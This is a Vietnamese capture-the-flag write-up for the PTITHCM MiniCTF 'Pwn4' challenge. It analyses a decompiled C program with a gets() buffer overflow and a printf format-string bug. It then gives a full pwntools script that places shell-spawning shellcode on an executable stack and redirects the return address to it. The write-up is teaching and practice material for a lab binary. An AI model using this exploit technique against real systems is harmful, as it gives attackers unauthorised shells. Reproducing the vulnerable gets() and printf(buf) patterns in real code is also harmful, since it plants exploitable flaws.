---
title: "Pwn4 - MiniCTF - PTITHCM"
date: 2024-01-06 00:00:00 +0700
categories: [CTF, Binary Exploitation]
tags: [pwn, shellcode, gets, stack-overflow, format-string, ptithcm]
author: datious
description: "MiniCTF PTITHCM Pwn4 writeup — stack shellcode injection through gets() buffer overflow với all protections disabled."
---

# Pwn4 - MiniCTF - PTITHCM
**Author: D1n0_09-N24DCAT015**

Đầu tiên khi tải về ta sẽ có 1 file `pwn4.rar` → Giải nén ta nhận được các file sau:

![Files](https://hackmd.io/_uploads/rJgQWTggbx.png)

> Dùng tool **pwninit** để tạo file patched giữa binary và libc do bài cung cấp.

## 1. Security Layers

![Checksec](https://hackmd.io/_uploads/By9tVaelWe.png)

→ **Tất cả các lớp bảo mật đều tắt!** Khai thác theo hướng shellcode là hoàn toàn khả thi.

## 2. Phân tích source code

Dùng **Ghidra** để decompile:

```c
int main(void)
{
  char buf [32];
  
  dump_stack();
  printf("Input: ");
  gets(buf);        // ← không giới hạn nhập → Buffer Overflow
  printf("Output: ");
  printf(buf);      // ← format string (bonus)
  putchar(10);
  dump_stack();
  return 0;
}
```

**Lỗ hổng:**
- `gets(buf)`: nhập không giới hạn → **Buffer Overflow**
- `printf(buf)`: **Format String Vulnerability** (bonus)

## 3. Khai thác

### Xác định offset

Vì 64-bit, mỗi thanh ghi 8 bytes.

Thử nhập payload 48 bytes → xác định offset:

![Offset](https://hackmd.io/_uploads/SJjLdTgeWl.png)

→ **Offset = 40 bytes** từ `buf` đến save RIP.

### Địa chỉ stack

Khi run chương trình, `dump_stack()` in ra địa chỉ của `buf`:

```
0x7fff........: 0000000000000000  ← rsp (đây là địa chỉ buf)
```

### Exploit Script

```python
#!/usr/bin/python3
from pwn import *

p = process('./chall_patched')

# Lấy địa chỉ buf từ output dump_stack
p.recvuntil(": ")
buf_addr = int(p.recvuntil(":").strip(b":").strip(), 16)
log.info(f"buf @ {hex(buf_addr)}")

# Shellcode x86_64
shellcode = asm(shellcraft.amd64.sh(), arch='amd64')

# Payload
payload  = shellcode
payload  = payload.ljust(40, b'A')   # pad đến offset
payload += p64(buf_addr)              # overwrite RIP → buf (shellcode)

p.sendlineafter("Input: ", payload)
p.interactive()
```

> **Lưu ý:** NX tắt nên stack có thể thực thi — đây là lý do shellcode trực tiếp hoạt động.
